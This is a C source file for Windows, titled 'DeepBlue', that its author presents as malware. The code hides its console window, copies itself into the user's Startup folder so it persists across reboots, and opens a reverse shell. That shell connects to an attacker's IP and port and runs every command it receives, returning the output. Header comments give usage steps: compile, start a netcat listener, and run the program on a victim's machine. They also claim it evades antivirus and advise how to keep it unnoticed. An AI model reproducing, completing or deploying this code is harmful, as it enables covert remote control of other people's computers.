#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define bzero(p, size) memset((p), 0, (size))

//Name: DeepBlue
//Author: Alex H.
//Date: 25.12.2025
//This is first time creating an actual malware. Its undetactable by most antiviruses and creates a reverse shell to a specified IP and port.
// It also copies itself to the startup folder to maintain persistence.You can also execute commands remotely.
// Use this for educational purposes only and i do not take any responsibility for any damage couse by this code.
//please dont use it for illegal activities. and if u want to test it always get permission first! thanks you ;]

//1. You should change the <YOUR_IP_ADDRESS> and <YOUR_PORT> to your own IP address and port where you want to receive the reverse shell connection.
//2. Compile the code using a C compiller that supports this code. ( gcc DeepBlue.c -o DeepBlue.exe -mwindows -lws2_32 -lshell32 -lole32 -luuid )
//3. Run NC listener on your port ( nc -nvlp <YOUR_PORT> ) make sure this port isnt used by any other application. i would reccomend using a high port number like 50003.
//4. Execute the compiled malware on the target machine. You should see a connection established on your NC listener, congratulations you madea connections, now you can execute commands remotely!
// You can type "q" to quit the connection, this is also gonna stop the app on victims machine.
// when he reboots the machine the malware is gonna start agian because its coppied to startup folder.
// But be aware most users that are a little techy are gonna notice a new application in their startup folder so use it wisely ;]


SOCKET sock;

void Shell(void)
{

    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (1) {
        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));

        if (recv(sock, buffer, sizeof(buffer) - 1, 0) <= 0)
            break;

        if (strncmp(buffer, "q", 1) == 0) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }

        FILE *fp = _popen(buffer, "r");
        if (!fp) continue;

        while (fgets(container, sizeof(container), fp) != NULL) {
            strncat(total_response, container,
                    sizeof(total_response) - strlen(total_response) - 1);
        }

        _pclose(fp);
        send(sock, total_response, strlen(total_response), 0);
    }
}

// this section hides the console window
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR lpCmdLine,
                     int nCmdShow)
{
    WSADATA wsaData;
    struct sockaddr_in ServAddr;

    const char *ServIP = "<YOUR_IP_ADRESS>"; // change this to ur IP addess
    unsigned short ServPort = "<YOUR_PORT>"; // change this to ur port ;]

    // this section is for copying the malware to startup folder
    char currentPath[MAX_PATH];
    char targetPath[MAX_PATH];
    char username[256];
    GetModuleFileName(NULL, currentPath, MAX_PATH);
    DWORD usernameLen = sizeof(username);
    GetUserName(username, &usernameLen);
    sprintf(targetPath, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\DeepBlue.exe", username);
    CopyFile(currentPath, targetPath, FALSE);

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return 1;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
        return 1;

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServPort);

    while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0) {
        Sleep(1000);
    }

    Shell();
    return 0;
}

